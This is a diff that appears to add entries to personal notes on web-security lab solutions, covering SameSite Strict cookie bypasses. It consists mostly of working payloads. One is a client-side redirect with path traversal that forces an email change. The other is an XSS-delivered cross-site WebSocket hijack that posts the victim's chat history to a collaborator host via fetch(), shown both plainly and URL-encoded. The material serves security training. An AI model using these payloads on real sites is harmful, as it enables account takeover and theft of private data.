@@ -64,3 +64,38 @@ Chaining with HTTP Header Injection attack
   </body>
 </html>
 ```
+
+# SameSite Strict bypass via client-side redirect
+```html
+<html>
+  <body>
+    <script>
+      document.location = "https://0ab300be042367bb8e52f549006800bf.web-security-academy.net/post/comment/confirmation?postId=1/../../../my-account/change-email?email=hack2%40test.com%26submit=1"
+    </script>
+  </body>
+</html>
+```
+
+# SameSite Strict bypass via sibling domain
+1. User is redirected to a website with different subdomain which is vulnerable to XSS
+2. XSS payload is
+```javascript
+<script>
+    var ws = new WebSocket('wss://0a3000b803074751804203d000d40031.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://0648kceqs985mif9anphzwo2wt2kqbe0.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+3. XSS payload
+ - creates a new websocket which is initiated with HTTPS request (sends its cookie with request)
+ - set onmessage event listener to send event data (chat history) to collaborator 
+
+```html
+<script>
+    document.location = "https://cms-0a3000b803074751804203d000d40031.web-security-academy.net/login?username=%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a3000b803074751804203d000d40031.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20ws.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2F0648kceqs985mif9anphzwo2wt2kqbe0.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=anything";
+</script>
+```
